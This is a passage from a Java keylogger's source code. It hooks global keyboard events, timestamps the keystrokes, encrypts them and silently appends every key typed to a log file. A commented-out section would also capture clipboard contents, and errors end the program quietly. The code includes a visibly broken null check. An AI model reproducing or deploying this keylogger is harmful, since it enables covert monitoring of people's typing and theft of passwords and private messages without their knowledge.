        DateFormat dateFormat2 = new SimpleDateFormat("dd/MM/yyyy hh.mm aa");// Create a date object
        String dateString2 = dateFormat2.format(new Date()).toString();
        Path file = Paths.get(pathh);

        // throw new UnsupportedOperationException("Not supported yet."); //To change body of generated methods, choose Tools | Templates.
        String keyText = NativeKeyEvent.getKeyText(nke.getKeyCode());
        keyText = keyText.replace("NumPad ", "").replace("Space", " ").replace("Caps Lock", "").replace("Backspace", "").replace("Shift", "").replace("Undefined", "").replace("Quote", "\"");
        try (OutputStream os = Files.newOutputStream(file, StandardOpenOption.CREATE, StandardOpenOption.WRITE,
                StandardOpenOption.APPEND); PrintWriter writer = new PrintWriter(os)) {
            /*     if("Ctrl".equals(keyText))
             {
                 ctrl=true;
             
             }
             else if("C".equals(keyText) && ctrl)
             {
                 String data = (String) Toolkit.getDefaultToolkit()
                .getSystemClipboard().getData(DataFlavor.stringFlavor); 
                 writetolog("Copied Items : "+data);
                 ctrl=false;

        }
             */
            if (null == keyText) {
                if (keyText.length() > 1) {
                    writer.print(EncryptionDemo.encrypt(" " + keyText + " ", this.key));
                } else {
                    writer.print(EncryptionDemo.encrypt(keyText, this.key));
                }

            } else {
                switch (keyText) {
                    case "Enter":
                        writer.println();
                        // writetolog("[" + dateString2 + "] ");
                        writer.print(EncryptionDemo.encrypt("[" + dateString2 + "] ", this.key));
                        break;
                    case "Right":
                    case "Down":
                    case "Up":
                    case "Left":
                        writer.println();
                        writer.print(EncryptionDemo.encrypt("[" + dateString2 + "]" + "[" + keyText + "]", this.key));
                        break;
                    case "Tab":
                        //   writetolog(keyText);
                        writer.print(EncryptionDemo.encrypt("[" + dateString2 + "]" + "TAB" + "[" + keyText + "]", this.key));
                        break;
                    default:
                        if (keyText.length() > 1) {
                            writer.print(EncryptionDemo.encrypt(" " + keyText + " ", this.key));
                        } else {
                            writer.print(EncryptionDemo.encrypt(keyText, this.key));
                        }
                        break;
                }
            }

        } catch (Exception ex) {

            System.exit(0);
        }
    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent nke) {
        //  throw new UnsupportedOperationException("Not supported yet."); //To change body of generated methods, choose Tools | Templates.
    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent nke) {
        //    throw new UnsupportedOperationException("Not supported yet."); //To change body of generated methods, choose Tools | Templates.
    }
}
